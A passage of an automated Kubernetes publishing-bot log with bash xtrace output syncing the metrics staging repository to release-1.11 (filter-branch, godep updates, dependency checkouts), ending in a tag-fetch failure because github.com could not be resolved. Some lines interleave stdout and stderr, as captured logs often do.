kubernetes-1.10.0-beta.4.\n>\tIgnoring already published tag kubernetes-1.10.0.\n>\tIgnoring already published tag kubernetes-1.10.2-beta.0.\n>\t++ git rev-parse release-1.10\n>\t+ '[' b11cf31b380ba10a99b7c0b900f6a71f1045db45 '!=' b11cf31b380ba10a99b7c0b900f6a71f1045db45 ']'\n>\t+ git checkout release-1.10\n>\tAlready on 'release-1.10'\n>\tYour branch is up-to-date with 'origin/release-1.10'.\n>[02 Sep 18 13:03 UTC]: Successfully constructed release-1.10\n>[02 Sep 18 13:03 UTC]: /publish_scripts/construct.sh metrics release-1.11 release-1.11 apimachinery:release-1.11,api:release-1.11,client-go:release-8.0  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/metrics kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"\n>\t+ '[' '!' 12 -eq 12 ']'\n>\t+ REPO=metrics\n>\t+ SRC_BRANCH=release-1.11\n>\t+ DST_BRANCH=release-1.11\n>\t+ DEPS=apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/metrics\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ readonly SRC_BRANCH DST_BRANCH DEPS SOURCE_REMOTE SOURCE_REPO_ORG SOURCE_REPO_NAME BASE_PACKAGE SUBDIR IS_LIBRARY\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\tFetching from origin.\n>\t\tCleani+ echo 'Cleng up checaning up checkout.'\n>\t+ kgit rebase --abort\n>out.\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ git branch -D release-1.11\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.11\n>\t\tSwitching+ echo 'Switching to  oto orrigin/release-1.11.'\n>\t+ git branch -f release-1.11 originig/rielease-n1.11\n>/release-1.11.\n>\t+ git checkout -q release-1.11\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/metrics release-1.11 release-1.11 /go-workspace/src/k8s.io/kubernetes/.git apimachinery:release-1.11,api:release-1.11,client-go:release-8.0 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/metrics\n>\t+ local src_branch=release-1.11\n>\t+ local dst_branch=release-1.11\n>\t+ local kubernetes_remote=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ local deps=apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ shift 9\n>\t+ local is_library=true\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch kubernetes_remote deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\tb3132de4fe0fc20471297e9ba8902bac4132756e\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 10 = 0 ']'\n>\t++ git rev-parse HEAD\n>\t\tSta+ echo 'Starting at existing release-1.11 commit b3132rting de4fe0fc20471297e9ba8902bac4132756e.'\n>\t+ git remote rm upstrat existing eam\n>release-1.11 commit b3132de4fe0fc20471297e9ba8902bac4132756e.\n>\t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.11\n>\tBranch upstream-branch set up to track remote branch release-1.11 from upstream.\n>\t++ git rev-parse upstream-branch\n>\t\tC+ echo 'Checked out source commit 86c0fa1f8c360hecked out sfe93b6b10c1db31e9e442097985.'\n>\t+ git checkout -q upstream-branch -b fource commit 86c0fa1f8c360fe93b6b10c1db31e9e442097985.\n>iltered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-1.11\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-1.11\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ true\n>\t+ local k_base_commit=5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>\t+ '[' -z 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ']'\n>\t++ git-find-merge 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 upstream/release-1.11\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list '5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06^1..upstream/release-1.11' --first-parent\n>\t+++ git rev-list 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06..upstream/release-1.11 --ancestry-path\n>\t+++ git rev-parse 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>\t+ local k_base_merge=5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>\t+ '[' -z 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ']'\n>\t+ git branch -f filtered-branch-base 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>\t\tRewriting+ echo 'Rewriting upstream branch release-1.11 to only include commits for staging/src/k8 upstres.io/metrics.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/metrics 'BUILDam branch rele */BaUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubseernetes-com-1mit.\n>\t+ local subdirectory=staging/src/k8s.io/metrics\n>\t+ local 'recursive_del11 toete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git fil toern-blranch ...'\n>\t+ yl ocal index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.biazel Gopkg.toml' ']'ncl\n>u\t+ patternds=()\n>\t+ local patteren s\n>\t+ local p=\n>\t+ index_filter='git rcm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p io '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_fmmits for stialter+=' '\\''BUILD.bazel'\\g'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>i\t+ for p in '\"${patterns[@]}\"'\n>\t+n index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q g-/-cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/metrics -- filtered-bransrch filtered-branch-base\n>c/k8s.io/metrics.\n>\tRunning git filter-branch ...\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=947a2ef33fedf754044c85476302be44e2c169fa\n>\t++ git log --first-parent --format=%H --reverse 947a2ef33fedf754044c85476302be44e2c169fa..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-1.11.'\n>\t+ git checkout -q release-1.11\n>\tChecking out branch release-1.11.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=b3132de4fe0fc20471297e9ba8902bac4132756e\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=b3132de4fe0fc20471297e9ba8902bac4132756e\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\t++ git rev-parse HEAD\n>\tFixing up godeps after a complete sync\n>\t+ '[' b3132de4fe0fc20471297e9ba8902bac4132756e '!=' b3132de4fe0fc20471297e9ba8902bac4132756e ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.11,api:release-1.11,client-go:release-8.0 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=b3132de4fe0fc20471297e9ba8902bac4132756e\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.11,api:release-1.11,client-go:release-8.0 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/metrics/\") or . == \"k8s.io/metrics\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t\tR+ echo 'Running godep restore.'\n>\t+ godep restore\n>unning godep restore.\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>\t+ '[' -z 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ']'\n>\t++ git-find-merge 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06..upstream-branch --ancestry-path\n>\t+++ git rev-parse 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>\t+ local k_last_kube_merge=5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>\t+ local dep_count=3\n>\t+ (( i=0 ))\n>\t+ (( i<3 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.11\n>\t+ echo 'Looking up which commit in the release-1.11 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ../kube-commits-apimachinery-release-1.11\n>\tLooking up which commit in the release-1.11 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06.\n>\t+ '[' -z 103fd098999dc9c0c88536f5c9ad2e5da39373ae ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to 103fd098999dc9c0c88536f5c9ad2e5da39373ae'\n>\t+ git checkout -q 103fd098999dc9c0c88536f5c9ad2e5da39373ae\n>\tChecking out k8s.io/apimachinery to 103fd098999dc9c0c88536f5c9ad2e5da39373ae\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.11\n>\t+ echo 'Looking up which commit in the release-1.11 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-1.11 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06.\n>\t++ look -b 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ../kube-commits-api-release-1.11\n>\t+ '[' -z 9e325467be0d83799fa9d630047839982ced21d0 ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 9e325467be0d83799fa9d630047839982ced21d0'\n>\t+ git checkout -q 9e325467be0d83799fa9d630047839982ced21d0\n>\tChecking out k8s.io/api to 9e325467be0d83799fa9d630047839982ced21d0\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=client-go\n>\t+ local branch=release-8.0\n>\t+ echo 'Looking up which commit in the release-8.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-8.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06.\n>\t++ look -b 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ../kube-commits-client-go-release-8.0\n>\t+ '[' -z e5bc2a7bbbdf78f2a331b8c23838d1bbb1c6b40a ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to e5bc2a7bbbdf78f2a331b8c23838d1bbb1c6b40a'\n>\t+ git checkout -q e5bc2a7bbbdf78f2a331b8c23838d1bbb1c6b40a\n>\tChecking out k8s.io/client-go to e5bc2a7bbbdf78f2a331b8c23838d1bbb1c6b40a\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\t\t+ echo 'RRunning godep save.'\n>\t+ godep save ./...\n>unning godep save.\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.11 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.11 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code b3132de4fe0fc20471297e9ba8902bac4132756e\n>\t\tRemove redu+ echno 'Remove redundant godep commits on-top of b3132de4fe0fc20471297e9ba8902bac4132756e.'\n>\tdan+ git reset --soft -t gq b3132de4fe0fc20471297e9ba8902bac4132756e\n>odep commits on-top of b3132de4fe0fc20471297e9ba8902bac4132756e.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ local repo=metrics\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '332ec57 Merge pull request #65283 from liggitt/automated-cherry-pick-of-#65256-upstream-release-1.11' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.11'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.11\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.11\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=b3132de4fe0fc20471297e9ba8902bac4132756e\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-metrics-release-1.11.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-metrics-release-1.11.sh\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.11 --push-script ../push-tags-metrics-release-1.11.sh --dependencies apimachinery:release-1.11,api:release-1.11,client-go:release-8.0 -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tfatal: unable to access 'https://github.com/kubernetes/metrics/': Could not resolve host: github.com\n>\tF0902 13:04:31.823847   20530 main.go:147] Failed to fetch tags for \"origin\": exit status 128\n>\tgoroutine 1 [running]:\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc43d88b100, 0xc44d0c2d80, 0x5e, 0xb2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xa5fdc0, 0xc400000003, 0xc4200e8000, 0xa089d6, 0x7, 0x93, 0x0)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xa5fdc0, 0x3, 0x81df10, 0x1f, 0xc4206e5cd8, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x81df10, 0x1f, 0xc4206e5cd8, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>\tmain.main()\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:147 +0xe7f\n>[02 Sep 18 13:04 UTC]: exit status 255\n>    \t+ '[' '!' 12 -eq 12 ']'\n>    \t+ REPO=metrics\n>    \t+ SRC_BRANCH=release-1.11\n>    \t+ DST_BRANCH=release-1.11\n>    \t+ DEPS=apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/metrics\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=true\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ readonly SRC_BRANCH DST_BRANCH DEPS SOURCE_REMOTE SOURCE_REPO_ORG SOURCE_REPO_NAME BASE_PACKAGE SUBDIR IS_LIBRARY\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>    \t+ git branch -D release-1.11\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/release-1.11\n>    \t+ echo 'Switching to origin/release-1.11.'\n>    \t+ git branch -f release-1.11 origin/release-1.11\n>    \t+ git checkout -q release-1.11\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/metrics release-1.11 release-1.11 /go-workspace/src/k8s.io/kubernetes/.git apimachinery:release-1.11,api:release-1.11,client-go:release-8.0 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/metrics\n>    \t+ local src_branch=release-1.11\n>    \t+ local dst_branch=release-1.11\n>    \t+ local kubernetes_remote=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ local deps=apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ shift 9\n>    \t+ local is_library=true\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch kubernetes_remote deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 10 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing release-1.11 commit b3132de4fe0fc20471297e9ba8902bac4132756e.'\n>    \t+ git remote rm upstream\n>    \t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/release-1.11\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit 86c0fa1f8c360fe93b6b10c1db31e9e442097985.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit release-1.11\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B release-1.11\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ true\n>    \t+ local k_base_commit=5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>    \t+ '[' -z 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ']'\n>    \t++ git-find-merge 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 upstream/release-1.11\n>    \t++ tail -1\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list '5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06^1..upstream/release-1.11' --first-parent\n>    \t+++ git rev-list 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06..upstream/release-1.11 --ancestry-path\n>    \t+++ git rev-parse 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>    \t+ local k_base_merge=5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>    \t+ '[' -z 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06 ']'\n>    \t+ git branch -f filtered-branch-base 5f5d6aa92b27bc300c631fd3fe26edc0f55fbb06\n>    \t+ echo 'Rewriting upstream branch release-1.11 to only include commits for staging/src/k8s.io/metrics.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/metrics 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/metrics\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ 